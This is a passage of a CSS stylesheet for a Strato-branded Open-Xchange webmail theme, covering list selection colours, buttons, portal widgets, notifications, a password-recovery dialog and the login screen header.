        }

        .list-view.visible-selection.has-focus .list-item.selected i.fa-checkmark {
            color: #0074b5;
        }

        .vgrid-cell:hover,
        .vgrid-cell:focus {
            background: #e9f0fa;
            color: #000;
        }

        .vgrid-cell.selected {
            background: #e9f0fa;
            color: #000;
        }

        .vgrid-cell.selected:hover,
        .vgrid-cell.selected:focus {
            background: #e9f0fa;
            color: #000;
        }

        .vgrid-cell.selected .vgrid-cell-checkbox i.fa:before {
            color: #0074b5;
        }

        .address-picker.visible-selection.has-focus .list-item.selected,
        .chronos-item.visible-selection.has-focus .list-item.selected,
        .file-list-view.visible-selection.has-focus .list-item.selected {
            background: #e9f0fa;
            color: #000;
        }

        .address-picker.visible-selection.has-focus .list-item.selected:hover,
        .chronos-item.visible-selection.has-focus .list-item.selected:hover,
        .file-list-view.visible-selection.has-focus .list-item.selected:hover,
        .address-picker.visible-selection.has-focus .list-item.selected:focus,
        .chronos-item.visible-selection.has-focus .list-item.selected:focus,
        .file-list-view.visible-selection.has-focus .list-item.selected:focus {
            background: #e9f0fa;
            color: #000;
        }

        .address-picker.visible-selection.has-focus .list-item.selected *,
        .chronos-item.visible-selection.has-focus .list-item.selected *,
        .file-list-view.visible-selection.has-focus .list-item.selected *,
        .address-picker.visible-selection.has-focus .list-item.selected .file-type-icon:before,
        .chronos-item.visible-selection.has-focus .list-item.selected .file-type-icon:before,
        .file-list-view.visible-selection.has-focus .list-item.selected .file-type-icon:before {
            color: #000 !important;
        }

        .address-picker.visible-selection.has-focus .list-item.selected .list-item-checkmark .fa-checkmark:before,
        .chronos-item.visible-selection.has-focus .list-item.selected .list-item-checkmark .fa-checkmark:before,
        .file-list-view.visible-selection.has-focus .list-item.selected .list-item-checkmark .fa-checkmark:before {
            color: #0074b5 !important;
        }

        .address-picker.visible-selection.has-focus .list-item.selected .tooltip>div,
        .chronos-item.visible-selection.has-focus .list-item.selected .tooltip>div,
        .file-list-view.visible-selection.has-focus .list-item.selected .tooltip>div {
            color: #fff !important;
        }

        .address-picker.visible-selection.has-focus .list-item.selected .vgrid-cell-checkbox i.fa:before,
        .chronos-item.visible-selection.has-focus .list-item.selected .vgrid-cell-checkbox i.fa:before,
        .file-list-view.visible-selection.has-focus .list-item.selected .vgrid-cell-checkbox i.fa:before {
            color: #0074b5;
        }

        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected *,
        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected:not(.marked):focus * {
            color: #000;
        }

        .has-focus .vgrid-cell:hover,
        .has-focus .vgrid-cell:focus {
            background: #e9f0fa;
            color: #000;
        }

        .has-focus .vgrid-cell.selected {
            background: #e9f0fa;
            color: #000;
        }

        .has-focus .vgrid-cell.selected:hover,
        .has-focus .vgrid-cell.selected:focus {
            background: #e9f0fa;
            color: #000;
        }

        .has-focus .vgrid-cell.selected .vgrid-cell-checkbox i.fa:before {
            color: #0074b5;
        }

        .btn:not(.btn-search):not(.btn-link),
        .mail-detail .shadow-root-container::shadow .mail-detail-content .btn,
        .mail-detail .content .btn {
            padding: 4px 20px;
            min-width: 100px;
            border-radius: 5px;
            text-align: center;
            min-height: 30px;
            box-sizing: border-box;
        }

        .btn:not(.btn-search):not(.btn-link):focus {
            outline: none;
        }

        .btn:not(.btn-search):not(.btn-link).btn-default,
        .btn:not(.btn-search):not(.btn-link).pull-left,
        .btn:not(.btn-search):not(.btn-link).wizard-prev {
            color: #666;
            background-image: -webkit-linear-gradient(top, #f8f8f8 0, #eaeaea 100%);
            background-image: -o-linear-gradient(top, #f8f8f8 0, #eaeaea 100%);
            background-image: linear-gradient(to bottom, #f8f8f8 0, #eaeaea 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff8f8f8', endColorstr='#ffeaeaea', GradientType=0);
            background-repeat: repeat-x;
            border-color: #ccc;
        }

        .btn:not(.btn-search):not(.btn-link).btn-default:hover,
        .btn:not(.btn-search):not(.btn-link).pull-left:hover,
        .btn:not(.btn-search):not(.btn-link).wizard-prev:hover {
            outline: none;
            background-image: -webkit-linear-gradient(top, #f8f8f8 0, #ccc 100%);
            background-image: -o-linear-gradient(top, #f8f8f8 0, #ccc 100%);
            background-image: linear-gradient(to bottom, #f8f8f8 0, #ccc 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff8f8f8', endColorstr='#ffcccccc', GradientType=0);
            background-repeat: repeat-x;
            border-color: #ccc;
            color: #07b;
        }

        .btn:not(.btn-search):not(.btn-link).btn-default:active,
        .btn:not(.btn-search):not(.btn-link).pull-left:active,
        .btn:not(.btn-search):not(.btn-link).wizard-prev:active {
            background-image: -webkit-linear-gradient(top, #ccc 20%, #eaeaea 80%);
            background-image: -o-linear-gradient(top, #ccc 20%, #eaeaea 80%);
            background-image: linear-gradient(to bottom, #ccc 20%, #eaeaea 80%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffcccccc', endColorstr='#ffeaeaea', GradientType=0);
            background-repeat: repeat-x;
            border-color: #ccc;
            color: #0074b5;
        }

        .btn:not(.btn-search):not(.btn-link).wizard-next.btn-disabled,
        .btn:not(.btn-search):not(.btn-link).btn-primary {
            color: #fff;
            border-color: #07b;
            background-image: -webkit-linear-gradient(top, #0074b5 0, #07b 100%);
            background-image: -o-linear-gradient(top, #0074b5 0, #07b 100%);
            background-image: linear-gradient(to bottom, #0074b5 0, #07b 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0074b5', endColorstr='#ff0077bb', GradientType=0);
            background-repeat: repeat-x;
        }

        .btn:not(.btn-search):not(.btn-link).wizard-next.btn-disabled:hover,
        .btn:not(.btn-search):not(.btn-link).btn-primary:hover {
            outline: none;
            background-image: -webkit-linear-gradient(top, #0074b5 0, #004576 100%);
            background-image: -o-linear-gradient(top, #0074b5 0, #004576 100%);
            background-image: linear-gradient(to bottom, #0074b5 0, #004576 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0074b5', endColorstr='#ff004576', GradientType=0);
            background-repeat: repeat-x;
            border-color: #004576;
            color: #fff;
        }

        .btn:not(.btn-search):not(.btn-link).wizard-next.btn-disabled:active,
        .btn:not(.btn-search):not(.btn-link).btn-primary:active {
            background-image: -webkit-linear-gradient(top, #004576 20%, #07b 80%);
            background-image: -o-linear-gradient(top, #004576 20%, #07b 80%);
            background-image: linear-gradient(to bottom, #004576 20%, #07b 80%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff004576', endColorstr='#ff0077bb', GradientType=0);
            background-repeat: repeat-x;
            border-color: #004576;
            color: #fff;
        }

        .btn:not(.btn-search):not(.btn-link).wizard-next.btn-disabled[disabled],
        .btn:not(.btn-search):not(.btn-link).btn-primary[disabled] {
            background: #8cb9d6;
            border-color: #66a2c9;
            font-color: rgba(255, 255, 255, 0.5);
        }

        .io-ox-viewer.viewer-dark-theme .viewer-sidebar .viewer-uploadnewversion>.form-group>.btn-default {
            border-radius: 3px;
            background-image: none;
        }

        .mail-detail .shadow-root-container::shadow .mail-detail-content .btn,
        .mail-detail .content .btn {
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol" !important;
            font-size: 14px;
            padding-top: 6px;
        }

        .mail-detail .shadow-root-container::shadow .mail-detail-content a.deep-link,
        .mail-detail .content a.deep-link {
            color: #fff;
            border-color: #07b;
            background-image: -webkit-linear-gradient(top, #0074b5 0, #07b 100%);
            background-image: -o-linear-gradient(top, #0074b5 0, #07b 100%);
            background-image: linear-gradient(to bottom, #0074b5 0, #07b 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0074b5', endColorstr='#ff0077bb', GradientType=0);
            background-repeat: repeat-x;
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol" !important;
            font-size: 14px;
            min-width: 100px;
            border-radius: 5px;
            text-align: center;
        }

        .mail-detail .upsell i {
            padding-right: 10px;
        }

        .input-group .btn.input-group-addon {
            min-width: 25px;
            border-radius: 0 5px 5px 0;
        }

        .form-control {
            border-color: #ddd;
        }

        .form-control:focus,
        .form-control.focus {
            border-color: #999;
            box-shadow: none;
        }

        .form-control:not(.search-field):not(textarea):not(.tokenfield) {
            height: 30px;
        }

        .form-control:not(.search-field):not(textarea):not(.tokenfield)[disabled] {
            background: #f3f3f3;
        }

        .io-ox-office-main .input-wrapper>input.form-control {
            height: 100%;
        }

        .io-ox-mail-compose .mail-compose-fields .line-focus:focus-within {
            border-top: 1px solid;
            border-color: #999;
            box-shadow: none;
            margin-bottom: -1px;
            min-height: 41px;
            top: -1px;
        }

        .io-ox-mail-compose .editable-toolbar.fixed {
            top: 160px;
            opacity: 1;
        }

        .error .form-control:not(.search-field) {
            border-color: #df1100;
        }

        .help-block.error {
            color: #df1100;
        }

        @media (min-width: 480px) {
            .row label:not(.checkbox):not(.radio):not(.control-label.col-xs-12) {
                font-weight: normal;
            }
        }

        @media (min-width: 480px) {

            .form-horizontal .control-label,
            label:not(.select-all):not(.checkbox):not(.radio):not(.control-label.col-xs-12),
            legend {
                font-weight: normal;
            }
        }

        .thread-view-list>h1 {
            font-weight: normal;
        }

        .header-name,
        .clear-title {
            font-weight: bold;
        }

        .window-container.header-top .window-header {
            height: auto;
        }

        .window-container.header-top .window-header.default-header-padding {
            padding: 20px;
        }

        .window-container.header-top .window-body {
            top: 60px;
        }

        .mail-detail header>a,
        .mail-detail header .unread-toggle {
            color: #07b;
        }

        .mail-detail header>a:hover,
        .mail-detail header .unread-toggle:hover,
        .mail-detail header>a:focus,
        .mail-detail header .unread-toggle:focus {
            cursor: default;
            color: #07b;
        }

        .io-ox-mail-compose-window .window-header .row {
            display: -webkit-flex;
            display: flex;
            -webkit-align-items: center;
            align-items: center;
        }

        .io-ox-mail-compose-window .window-header h1.clear-title {
            font-weight: normal;
        }

        .io-ox-dropzone-active .io-ox-dropzone-multiple-overlay {
            background-color: rgba(0, 0, 0, 0.7);
        }

        .io-ox-dropzone-multiple-overlay .io-ox-dropzone-action div {
            border: 1px dashed #aaa;
            background: #fff;
        }

        .io-ox-dropzone-multiple-overlay .io-ox-dropzone-action.io-ox-dropzone-hover div {
            border-color: 1px dashed #aaa;
            background-color: #fff;
        }

        #io-ox-windowmanager-pane {
            background-color: #fff;
        }

        #io-ox-windowmanager-pane .progress-bar {
            background-image: -webkit-linear-gradient(top, #ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
            background-image: linear-gradient(#ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
        }

        #io-ox-windowmanager-pane .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal li.widget[data-widget-type="notifications"] h3 {
            font-size: 14px;
            font-weight: bold;
            margin: 0;
        }

        #io-ox-windowmanager-pane .io-ox-portal li.widget[data-widget-type="upsell"] h2 {
            color: #f80;
        }

        #io-ox-windowmanager-pane .io-ox-portal li.widget .content:focus {
            background: transparent;
        }

        #io-ox-windowmanager-pane .io-ox-portal li.widget .upsell ul {
            text-align: left;
            list-style: disc;
            margin-bottom: 9px;
        }

        #io-ox-windowmanager-pane .io-ox-portal li.widget .upsell .fa-arrow-circle-up {
            cursor: pointer;
            font-size: 5em;
            padding-bottom: 15px;
        }

        #io-ox-windowmanager-pane .io-ox-portal li.widget .upsell h2 {
            color: #f80;
            overflow: visible;
            text-overflow: none;
            height: auto;
            white-space: normal;
            cursor: pointer;
        }

        #io-ox-windowmanager-pane .io-ox-portal li.widget .upsell .accent {
            color: #f80;
        }

        #io-ox-windowmanager-pane .io-ox-portal li.widget .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-black .progress-bar {
            background-image: -webkit-linear-gradient(top, #333 0, #333 50%, #333 51%, #333 100%);
            background-image: linear-gradient(#333 0, #333 50%, #333 51%, #333 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-black .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-red .progress-bar {
            background-image: -webkit-linear-gradient(top, #c00 0, #c00 50%, #900 51%, #900 100%);
            background-image: linear-gradient(#c00 0, #c00 50%, #900 51%, #900 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-red .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-orange .progress-bar {
            background-image: -webkit-linear-gradient(top, #f80 0, #f80 50%, #f80 51%, #f80 100%);
            background-image: linear-gradient(#f80 0, #f80 50%, #f80 51%, #f80 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-orange .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-lightgreen .progress-bar {
            background-image: -webkit-linear-gradient(top, #79bb32 0, #79bb32 50%, #5f9327 51%, #5f9327 100%);
            background-image: linear-gradient(#79bb32 0, #79bb32 50%, #5f9327 51%, #5f9327 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-lightgreen .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-green .progress-bar {
            background-image: -webkit-linear-gradient(top, #198819 0, #198819 50%, #198819 51%, #198819 100%);
            background-image: linear-gradient(#198819 0, #198819 50%, #198819 51%, #198819 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-green .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-lightblue .progress-bar {
            background-image: -webkit-linear-gradient(top, #04aef4 0, #04aef4 50%, #048ac2 51%, #048ac2 100%);
            background-image: linear-gradient(#04aef4 0, #04aef4 50%, #048ac2 51%, #048ac2 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-lightblue .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-blue .progress-bar {
            background-image: -webkit-linear-gradient(top, #07b 0, #07b 50%, #005788 51%, #005788 100%);
            background-image: linear-gradient(#07b 0, #07b 50%, #005788 51%, #005788 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-blue .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-purple .progress-bar {
            background-image: -webkit-linear-gradient(top, #7e16cf 0, #7e16cf 50%, #6211a1 51%, #6211a1 100%);
            background-image: linear-gradient(#7e16cf 0, #7e16cf 50%, #6211a1 51%, #6211a1 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-purple .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-pink .progress-bar {
            background-image: -webkit-linear-gradient(top, #b316ad 0, #b316ad 50%, #851181 51%, #851181 100%);
            background-image: linear-gradient(#b316ad 0, #b316ad 50%, #851181 51%, #851181 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-pink .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-gray .progress-bar {
            background-image: -webkit-linear-gradient(top, #444 0, #444 50%, #2b2b2b 51%, #2b2b2b 100%);
            background-image: linear-gradient(#444 0, #444 50%, #2b2b2b 51%, #2b2b2b 100%);
        }

        #io-ox-windowmanager-pane .io-ox-portal .widget-color-gray .progress-bar.bar-danger {
            background: #c00;
        }

        #io-ox-windowmanager-pane .io-ox-portal .badge {
            font-weight: normal;
            background: #ddd;
            color: #666;
            border-radius: 5px;
            padding: 1px 7px;
        }

        .window-sidepanel .upsell-link-wrapper {
            position: static;
            width: 100%;
            height: 60px;
            overflow: hidden;
        }

        .window-sidepanel .upsell-link {
            position: relative;
            left: 40px;
            top: 14px;
            float: left;
        }

        .window-sidepanel .upsell-link a {
            border-radius: 0;
            padding: 4px 10px;
            color: #fff;
            background: #f80;
            display: -webkit-flex;
            display: flex;
        }

        .window-sidepanel .upsell-link a:hover,
        .window-sidepanel .upsell-link a:focus {
            background: #dd5800;
            outline: none;
        }

        .window-sidepanel .upsell-link a:active {
            color: rgba(255, 255, 255, 0.7);
            background: #dd5800;
            outline: none;
        }

        .window-sidepanel .upsell-link a i {
            font-size: 1.5em;
            margin-right: 10px;
        }

        .window-sidepanel .upsell-link a span {
            padding-top: 2px;
        }

        .window-sidepanel .links.quota .progress .progress-bar {
            background-image: -webkit-linear-gradient(top, #ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
            background-image: linear-gradient(#ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
        }

        .window-sidepanel .links.quota .progress .progress-bar.bar-danger {
            background: #c00;
        }

        .window-sidepanel .io-ox-quota-view {
            margin-top: 16px;
        }

        .files-wrapper .files-container.view-icon:focus .file-cell.selected,
        .files-wrapper .files-container.view-list:focus .file-cell.selected {
            background: #07b;
        }

        .files-wrapper .files-container.view-icon:focus .file-cell.selected:hover,
        .files-wrapper .files-container.view-list:focus .file-cell.selected:hover,
        .files-wrapper .files-container.view-icon:focus .file-cell.selected:focus,
        .files-wrapper .files-container.view-list:focus .file-cell.selected:focus {
            background: #004576;
        }

        .files-wrapper .files-container.view-icon .file-cell:hover,
        .files-wrapper .files-container.view-list .file-cell:hover,
        .files-wrapper .files-container.view-icon .file-cell:focus,
        .files-wrapper .files-container.view-list .file-cell:focus {
            background: #d5d5d5;
        }

        .files-wrapper .files-container.view-icon .file-cell.selected,
        .files-wrapper .files-container.view-list .file-cell.selected {
            background: #e5e5e5;
        }

        .files-wrapper .files-container.view-icon .file-cell.selected:hover,
        .files-wrapper .files-container.view-list .file-cell.selected:hover {
            background: #f3f3f3;
        }

        .files-wrapper .files-container.view-tile:focus .file-cell.selected {
            color: #07b;
        }

        .files-wrapper .files-container.view-tile:focus .file-cell.selected .preview-cover {
            border-color: #07b;
        }

        .files-wrapper .files-container.view-tile:focus .file-cell.selected:hover,
        .files-wrapper .files-container.view-tile:focus .file-cell.selected:focus {
            color: #004576;
        }

        .files-wrapper .files-container.view-tile:focus .file-cell.selected:hover .preview-cover,
        .files-wrapper .files-container.view-tile:focus .file-cell.selected:focus .preview-cover {
            border-color: #004576;
        }

        .files-wrapper .files-container.view-tile .file-cell:hover,
        .files-wrapper .files-container.view-tile .file-cell:focus {
            color: #d5d5d5;
        }

        .files-wrapper .files-container.view-tile .file-cell:hover .preview-cover,
        .files-wrapper .files-container.view-tile .file-cell:focus .preview-cover {
            border-color: #d5d5d5;
        }

        .files-wrapper .files-container.view-tile .file-cell.selected {
            color: #e5e5e5;
        }

        .files-wrapper .files-container.view-tile .file-cell.selected .preview-cover {
            border-color: #e5e5e5;
        }

        .files-wrapper .files-container.view-tile .file-cell.selected:hover {
            color: #f3f3f3;
        }

        .files-wrapper .files-container.view-tile .file-cell.selected:hover .preview-cover {
            border-color: #f3f3f3;
        }

        .window-sidepanel.top-toolbar .folder-tree.has-upsell,
        .window-sidepanel.bottom-toolbar .folder-tree.has-upsell {
            bottom: 105px;
        }

        .window-body .list-view-control .toolbar .grid-options {
            padding-right: 5px;
        }

        .window-body .list-view-control .toolbar a:not(.breadcrumb-link):focus,
        .window-body .list-view-control .toolbar a:not(.breadcrumb-link):focus i {
            color: #333;
        }

        .window-body .list-view.visible-selection.has-focus .list-item.selected.deleted {
            background: #e9f0fa;
            color: #333;
        }

        .window-sidepanel.visible+.window-body .classic-toolbar .dropdown.pull-right>a {
            padding: 8px;
        }

        .io-ox-calendar-edit-window .io-ox-calendar-edit .header {
            display: -webkit-flex;
            display: flex;
            -webkit-align-items: center;
            align-items: center;
        }

        .io-ox-calendar-edit-window .io-ox-calendar-edit h1.clear-title {
            font-weight: normal;
        }

        .io-ox-calendar-edit-window .io-ox-calendar-edit .header h1.clear-title {
            font-weight: normal;
        }

        .io-ox-contacts-window .contact-detail .contact-header h1 {
            font-weight: normal;
        }

        .io-ox-contacts-window .contact-detail .contact-header h2 {
            font-weight: normal;
            color: #333;
        }

        .edit-contact h1.name {
            font-weight: normal;
        }

        .edit-contact legend.group {
            font-weight: normal;
            color: #333;
        }

        @media (min-width: 480px) {

            .edit-contact legend.simple,
            .edit-contact label {
                font-weight: normal;
            }
        }

        .edit-contact [data-field="note"] label {
            color: #333;
            font-weight: bold;
        }

        .io-ox-tasks-edit-window .io-ox-tasks-edit h1.clear-title {
            font-weight: normal;
        }

        @media (min-width: 480px) {
            .io-ox-tasks-edit-window .row legend {
                font-weight: normal;
            }
        }

        .io-ox-tasks-window .progress-bar {
            background-image: -webkit-linear-gradient(top, #ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
            background-image: linear-gradient(#ff9a40 0, #ff9a40 50%, #f80 51%, #f80 100%);
        }

        .io-ox-tasks-window .progress-bar.bar-danger {
            background: #c00;
        }

        .io-ox-tasks-window .badge {
            font-weight: normal;
            background: #ddd;
            color: #666;
            border-radius: 5px;
            padding: 1px 7px;
        }

        #io-ox-notifications {
            background: #f8f8f8;
            top: 105px !important;
        }

        #io-ox-notifications #io-ox-notifications-display {
            padding-left: 0;
            padding-right: 0;
            padding-bottom: 0;
        }

        #io-ox-notifications #io-ox-notifications-display .badge {
            font-weight: normal;
            background: #ddd;
            color: #666;
            border-radius: 5px;
            padding: 1px 7px;
        }

        #io-ox-notifications #io-ox-notifications-display .items {
            padding: 0;
            margin: 0;
        }

        #io-ox-notifications #io-ox-notifications-display .item:hover {
            background: #eaeaea;
        }

        #io-ox-notifications #io-ox-notifications-display .item .title {
            color: #333;
            font-weight: bold;
        }

        #io-ox-notifications #io-ox-notifications-display .section-title {
            font-weight: normal;
            color: #333;
        }

        #io-ox-notifications #io-ox-notifications-display .notifications {
            border-bottom: 1px dotted #ddd;
        }

        #io-ox-notifications #io-ox-notifications-display .notifications:last-child {
            border: none;
        }

        #io-ox-notifications #io-ox-notifications-display .btn {
            outline: none;
        }

        #io-ox-notifications #io-ox-notifications-display .desktop-notification-info .button-wrapper {
            flex-direction: row-reverse;
            justify-content: inherit;
        }

        #io-ox-notifications #io-ox-notifications-display .desktop-notification-info .button-wrapper .btn {
            margin-left: 5px;
        }

        #io-ox-notifications #io-ox-notifications-display :not(.desktop-notification-info) .btn:not(.btn-success):not(.clear-button):not(.btn-danger):not(.btn-warning) {
            border: none;
            background: transparent;
            box-shadow: none;
            width: auto;
            min-width: 0;
            min-height: 30px;
            color: #07b;
            padding: 0;
        }

        #io-ox-notifications #io-ox-notifications-display :not(.desktop-notification-info) .btn:not(.btn-success):not(.clear-button):not(.btn-danger):not(.btn-warning):hover {
            color: #004576;
            text-decoration: underline;
        }

        #io-ox-notifications #io-ox-notifications-display :not(.desktop-notification-info) .btn:not(.btn-success):not(.clear-button):not(.btn-danger):not(.btn-warning):active {
            color: #0074b5;
            text-decoration: underline;
        }

        #io-ox-notifications #io-ox-notifications-display :not(.desktop-notification-info) .btn:not(.btn-success):not(.clear-button):not(.btn-danger):not(.btn-warning).hide-area-button {
            padding: 0 14px;
        }

        #io-ox-notifications #io-ox-notifications-display .desktop-notification-info .btn {
            min-width: 0;
        }

        #io-ox-notifications #io-ox-notifications-display .clear-button {
            color: #666;
        }

        #io-ox-notifications #io-ox-notifications-display .clear-button:focus,
        #io-ox-notifications #io-ox-notifications-display .clear-button:hover {
            color: #07b;
            text-decoration: none;
        }

        #io-ox-notifications #io-ox-notifications-display .clear-button:active {
            color: #0074b5;
            text-decoration: none;
        }

        #io-ox-notifications #io-ox-notifications-display .hide-area-button {
            display: block;
            text-align: left;
            padding: 0 14px;
        }

        .ums-iframe-container {
            width: 100%;
            height: 100%;
            max-width: none !important;
        }

        .ums-iframe-container #ums-iframe {
            width: 100%;
            height: 100%;
            border: 0;
        }

        @media (min-width: 480px) {
            .wizard-step {
                width: 500px;
            }
        }

        .wizard-step iframe {
            width: 100%;
            height: 100%;
            border: 0;
            min-height: 210px;
        }

        .smartphone .wizard-container {
            overflow-y: auto;
        }

        .wizard-backdrop {
            background: #eee;
        }

        .inline-toolbar>li>a:focus,
        .classic-toolbar>li>a:focus,
        .mobile-navbar>li>a:focus {
            background: transparent;
            color: #07b;
        }

        .classic-toolbar .dropdown.pull-right>a {
            color: #333;
        }

        .classic-toolbar .dropdown.pull-right>a:focus,
        .classic-toolbar .dropdown.pull-right>a:hover {
            color: #07b;
            outline: none;
        }

        .classic-toolbar .dropdown.pull-right>a:active {
            color: #0074b5;
            outline: none;
        }

        .inline-toolbar .fa-lock {
            width: 1em;
        }

        .custom-dropdown .upsell {
            display: none;
        }

        .add-infostore-file .modal-body .io-ox-fileselection li.file.selected * {
            color: #333;
        }

        .file-list-view.visible-selection.has-focus .list-item.selected .file-type-icon:before,
        .myshares-list.visible-selection.has-focus .list-item.selected .file-type-icon:before,
        .myfavorites-list.visible-selection.has-focus .list-item.selected .file-type-icon:before {
            color: #333;
        }

        .myshares-list.visible-selection.has-focus .list-item.selected a,
        .myshares-list.visible-selection.has-focus .list-item.selected .type i {
            color: #333;
        }

        .viewer-dark-theme .viewer-sidebar .description-button,
        .viewer-sidebar .description-button {
            color: #07b;
        }

        .viewer-dark-theme .viewer-sidebar .description-button:focus,
        .viewer-sidebar .description-button:focus,
        .viewer-dark-theme .viewer-sidebar .description-button:hover,
        .viewer-sidebar .description-button:hover {
            color: #004576;
        }

        .viewer-dark-theme .viewer-sidebar .description-button:active,
        .viewer-sidebar .description-button:active {
            color: #0074b5;
        }

        .viewer-dark-theme .viewer-sidebar .description-button:focus,
        .viewer-sidebar .description-button:focus,
        .viewer-dark-theme .viewer-sidebar .description-button:hover,
        .viewer-sidebar .description-button:hover,
        .viewer-dark-theme .viewer-sidebar .description-button:active,
        .viewer-sidebar .description-button:active {
            text-decoration: underline;
        }

        .feedback {
            color: #666;
            font-size: 13px;
        }

        .feedback .form-control {
            font-size: 13px;
        }

        .feedback .modal-header {
            color: #f80;
        }

        .feedback h4,
        .feedback label {
            color: #333;
            font-size: 14px;
        }

        .drag-counter {
            color: #000;
        }

        .io-ox-alert {
            z-index: 200000;
        }

        @font-face {
            font-family: "OpenSans";
            src: local(Open Sans);
            src: url("https://webmail.strato.com/appsuite/apps/themes/commons/fonts/OpenSans-Regular.ttf") format("truetype");
            font-weight: 400;
        }

        @font-face {
            font-family: "OpenSans";
            src: local(Open Sans);
            src: url("https://webmail.strato.com/appsuite/apps/themes/commons/fonts/OpenSans-Bold.ttf") format("truetype");
            font-weight: bold;
        }

        @font-face {
            font-family: "OpenSansSemibold";
            src: local(Open Sans);
            src: url("https://webmail.strato.com/appsuite/apps/themes/commons/fonts/OpenSans-Semibold.ttf") format("truetype");
            font-weight: 400;
        }

        .modal.password-lost {
            font-family: "OpenSans", Lucida, Arial, sans-serif;
            z-index: 70000;
            background: rgba(0, 0, 0, 0.5);
        }

        .modal.password-lost .modal-header {
            min-height: auto;
            padding: 20px 16px 0;
            border-bottom: 0;
        }

        .modal.password-lost .btn {
            width: auto;
            float: right;
            border-radius: 2px;
            min-height: 40px;
            padding: 10px 20px;
            background: #07b;
            border: none;
            color: #fff;
        }

        .modal.password-lost .btn:focus,
        .modal.password-lost .btn:hover {
            outline: none;
            box-shadow: none;
            background: #00659f;
        }

        .modal.password-lost .btn:active {
            background: #005383;
        }

        .modal.password-lost .modal-content {
            max-width: 100vw;
        }

        .modal.password-lost .modal-footer {
            min-height: auto;
            padding: 0 16px 20px;
            border-top: 0;
        }

        .modal.password-lost .modal-footer a {
            font-size: 14px;
            padding-top: 10px;
        }

        .modal.password-lost .modal-footer a span {
            padding-right: 5px;
        }

        @media (max-width: 480px) {
            .modal.password-lost p {
                font-size: 13px;
            }
        }

        #io-ox-login-screen {
            font-family: "OpenSans", Lucida, Arial, sans-serif;
        }

        #io-ox-login-screen .help-block:empty {
            display: none;
        }

        #io-ox-login-screen #io-ox-login-container {
            color: #333;
            width: 100%;
            top: initial;
            position: initial;
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
        }

        #io-ox-login-screen #io-ox-login-container #box-form .alert.alert-info,
        #io-ox-login-screen #io-ox-login-container #box-form .alert.alert-info div {
            background: #c00;
            border: #c00;
            color: #fff;
        }

        #io-ox-login-screen #io-ox-login-container header {
            z-index: 2;
            margin: 0;
            box-sizing: border-box;
            box-shadow: 0 1px 0 #fff inset;
            color: #fff;
            line-height: 20px;
            min-height: 70px;
            padding: 25px 30px;
            width: 100%;
            background: #f80;
        }

        #io-ox-login-screen #io-ox-login-container header .wrapper {
            max-width: 1110px;
            margin: auto;
            position: relative;
        }

        #io-ox-login-screen #io-ox-login-container header .io-ox-logo {
            float: left;
            height: 40px;
            width: 125px;
            background: url("https://webmail.strato.com/appsuite/apps/themes/commons/stratoLogoWeiss.svg") no-repeat 0 0;
            background-size: contain;
            position: absolute;
            top: -5px;
        }

        @media (max-width: 480px) {
            #io-ox-login-screen #io-ox-login-container header .io-ox-logo {
                height: 20px;
                width: 15px;
                background-size: 63px 20px;
                top: 0;
            }
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages {
            margin-bottom: 0;
            margin-right: 10px;
        }

        @media (max-width: 480px) {
            #io-ox-login-screen #io-ox-login-container header #io-ox-languages {
                margin-right: 0;
            }
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown {
            position: relative;
            display: inline;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a {
            background: none;
            border: none;
            padding: 0;
            color: #fff;
            width: auto;
            min-width: 0;
        }

